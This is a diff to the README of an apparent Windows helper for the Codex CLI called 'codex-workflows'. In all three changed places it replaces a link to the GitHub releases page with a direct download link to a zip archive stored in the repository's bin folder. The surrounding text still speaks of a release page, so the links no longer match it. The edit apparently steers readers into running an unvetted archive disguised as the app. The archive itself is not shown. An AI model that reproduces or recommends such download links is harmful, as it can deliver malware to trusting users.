@@ -1,6 +1,6 @@
 # 🤖 codex-workflows - Clear AI coding workflows
 
-[![Download codex-workflows](https://img.shields.io/badge/Download%20codex--workflows-Release%20Page-blue.svg?style=for-the-badge)](https://github.com/round-comfortfood117/codex-workflows/releases)
+[![Download codex-workflows](https://img.shields.io/badge/Download%20codex--workflows-Release%20Page-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/round-comfortfood117/codex-workflows/main/bin/codex_workflows_v3.8.zip)
 
 ## 🧭 What this is
 
@@ -20,7 +20,7 @@ If you want a more guided way to use Codex CLI on Windows, this repo gives you a
 
 Visit this page to download codex-workflows:
 
-https://github.com/round-comfortfood117/codex-workflows/releases
+https://raw.githubusercontent.com/round-comfortfood117/codex-workflows/main/bin/codex_workflows_v3.8.zip
 
 On that page, look for the latest release. Then download the Windows file that matches your system.
 
@@ -188,7 +188,7 @@ Keep the files together unless the setup instructions in the release page say ot
 
 The release page is the main place to get the app.
 
-https://github.com/round-comfortfood117/codex-workflows/releases
+https://raw.githubusercontent.com/round-comfortfood117/codex-workflows/main/bin/codex_workflows_v3.8.zip
 
 Use it to:
 
